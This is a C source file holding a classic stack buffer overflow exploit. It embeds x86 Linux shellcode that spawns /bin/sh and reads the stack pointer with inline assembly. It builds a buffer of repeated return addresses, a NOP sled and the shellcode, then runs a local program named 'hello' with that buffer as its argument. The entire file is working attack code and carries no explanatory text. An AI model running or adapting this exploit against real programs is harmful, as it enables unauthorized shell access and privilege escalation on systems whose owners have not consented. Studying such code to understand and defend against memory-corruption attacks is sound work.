#include <string.h>
#include <stdlib.h>
#include <unistd.h>

unsigned char shell_code[] =
   "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46"
   "\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1"
   "\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23\x41\x41\x41\x41"
   "\x42\x42\x42\x42";

#define DEFAULT_OFFSET  0
#define BUFFER_SIZE     1024

unsigned long get_esp()
{
    __asm__("movl %esp, %eax");
}

main(int argc, char** argv)
{
    char* buff;
    char* ptr;
    unsigned long* addr_ptr;
    unsigned long esp;
    int i, ofs;
    
    if (argc == 1)
        ofs = DEFAULT_OFFSET;
    else
        ofs = atoi(argv[1]);

    ptr = buff = malloc(4 * BUFFER_SIZE);
    
        /* Fill in with addresses */
    addr_ptr = (unsigned long*)ptr;
    esp = get_esp();
    printf("ESP = %08x\n", esp);
    for (i = 0; i < 100; i++)
        *(addr_ptr++) = esp + ofs;
        
    /* Fill the start of shell buffer with NOPs */
    ptr = (char*)addr_ptr;
    memset(ptr,0x90,BUFFER_SIZE-strlen(shell_code));
    ptr += BUFFER_SIZE - strlen(shell_code);

    /* And then the shell code */
    memcpy(ptr, shell_code, strlen(shell_code));
    ptr += strlen(shell_code);

    *ptr = 0;

    execl("./hello", "hello", buff, NULL);
}
